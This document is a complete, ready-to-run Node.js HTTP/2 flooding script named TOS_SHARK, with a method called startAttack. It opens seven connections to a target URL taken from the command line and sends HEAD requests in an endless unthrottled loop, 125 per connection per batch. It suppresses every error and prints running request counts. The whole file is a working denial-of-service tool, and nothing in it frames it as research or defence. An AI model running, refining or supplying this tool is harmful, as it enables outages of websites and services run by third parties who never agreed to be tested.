const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        this.target = target;
        this.running = true;
        this.totalReqs = 0;
        this.lastLog = Date.now();
        this.connections = [];
        
        // Color codes
        this.colors = {
            reset: '\x1b[0m',
            darkMagenta: '\x1b[35m',
            darkGreen: '\x1b[32m',
            red: '\x1b[91m',
            green: '\x1b[92m'
        };
        
        this.startAttack();
    }

    async startAttack() {
        // Create 7 HTTP/2 connections
        for (let i = 0; i < 7; i++) {
            try {
                const client = http2.connect(this.target);
                this.connections.push(client);
                
                client.on('error', () => {});
            } catch (err) {}
        }
        
        // Start sending requests
        this.sendRequests();
    }

    sendRequests() {
        // Continuous request sending
        const sendBatch = () => {
            if (!this.running) return;
            
            for (const client of this.connections) {
                if (client && !client.destroyed) {
                    // Send 125 requests per connection
                    for (let i = 0; i < 125; i++) {
                        this.sendH2Request(client);
                        this.totalReqs++;
                    }
                }
            }
            
            // Log every 10 seconds
            const now = Date.now();
            if (now - this.lastLog >= 10000) {
                this.lastLog = now;
                this.logStatus(200); // Default status
            }
            
            // Continue
            setImmediate(sendBatch);
        };
        
        sendBatch();
    }

    sendH2Request(client) {
        try {
            const req = client.request({
                ':method': 'HEAD',
                ':path': '/',
                ':authority': new URL(this.target).hostname
            });
            
            req.on('response', (headers) => {
                this.lastStatus = headers[':status'];
                req.destroy();
            });
            
            req.on('error', () => {
                this.lastStatus = '*.*';
                req.destroy();
            });
            
            req.end();
        } catch (err) {
            this.lastStatus = '*.*';
        }
    }

    logStatus(status) {
        const prefix = `${this.colors.darkMagenta}TØR-2M11${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
        
        let statusColor = this.colors.green;
        let statusText = this.lastStatus || status;
        
        if (statusText === '*.*') {
            statusColor = this.colors.red;
        } else if (typeof statusText === 'number') {
            statusColor = (statusText >= 200 && statusText < 300) ? this.colors.green : this.colors.red;
        }
        
        console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
    }
}

// Run
if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
